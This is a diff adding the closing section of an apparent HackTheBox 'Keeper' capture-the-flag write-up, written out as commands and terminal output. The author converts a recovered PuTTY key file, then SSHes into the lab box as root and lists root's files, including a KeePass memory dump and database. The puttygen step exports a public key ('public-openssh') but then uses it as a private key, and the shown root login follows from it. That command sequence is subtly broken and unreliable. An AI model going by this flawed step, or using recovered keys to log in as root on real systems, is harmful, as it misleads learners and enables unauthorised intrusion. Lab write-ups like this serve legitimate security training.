@@ -211,7 +211,72 @@ Save the PuTTY-User-Key-File in a file say "bankai.ppk"
 
 We can use puttygen to create a .pem key file using the .ppk file.
 
-command:```
+command:```puttygen bankai.ppk -O public-openssh -o bankai.pem```
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/keeper]
+└─$ puttygen bankai.ppk -O public-openssh -o bankai.pem
+                                                                                  
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/keeper]
+└─$ ls -la bankai.pem 
+-rw-r--r-- 1 bl4ck4non bl4ck4non 398 Oct 21 18:36 bankai.pem
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/keeper]
+└─$ mv bankai.pem id_rsa
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/keeper]
+└─$ ls -la id_rsa    
+-rw-r--r-- 1 bl4ck4non bl4ck4non 398 Oct 21 18:36 id_rsa
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/keeper]
+└─$ chmod 600 id_rsa    
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/keeper]
+└─$ ls -la id_rsa
+-rw------- 1 bl4ck4non bl4ck4non 398 Oct 21 18:36 id_rsa
+```
+smooth, now we can ssh into the server as the root user using the ```id_rsa``` file
+
+command:```ssh -i id_rsa  root@tickets.keeper.htb```
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/keeper]
+└─$ ssh -i id_rsa  root@tickets.keeper.htb 
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+You have new mail.
+Last login: Sat Oct 21 16:02:59 2023 from 10.10.14.87
+root@keeper:~# id ; whoami ;ls -la
+uid=0(root) gid=0(root) groups=0(root)
+root
+total 332852
+drwx------  5 root root      4096 Oct 21 02:34 .
+drwxr-xr-x 18 root root      4096 Jul 27 13:52 ..
+lrwxrwxrwx  1 root root         9 May 24 15:54 .bash_history -> /dev/null
+-rw-r--r--  1 root root      3106 Dec  5  2019 .bashrc
+drwx------  2 root root      4096 May 24 16:58 .cache
+-rwxr-x---  1 root root 253395188 May 24 12:51 KeePassDumpFull.dmp
+-rw-------  1 root root        20 Jul 27 13:57 .lesshst
+lrwxrwxrwx  1 root root         9 May 24 15:54 .mysql_history -> /dev/null
+-rwxr-x---  1 root root      3630 May 24 12:51 passcodes.kdbx
+-rw-r--r--  1 root root       161 Dec  5  2019 .profile
+-rw-r-----  1 root root        33 Oct 21 00:50 root.txt
+-rw-r--r--  1 root root  87391651 Jul 25 19:56 RT30000.zip
+drwxr-xr-x  2 root root      4096 Oct 21 02:41 SQL
+drwxr-xr-x  2 root root      4096 May 24 16:09 .ssh
+-rw-r--r--  1 root root        39 Jul 20 19:03 .vimrc
+root@keeper:~# 
+```
+nice nice, we got root shell, we have successfully pwned this box
+
+That will be all for today
+<br><br>
+[Back To Home](../../index.md)
 
 
 
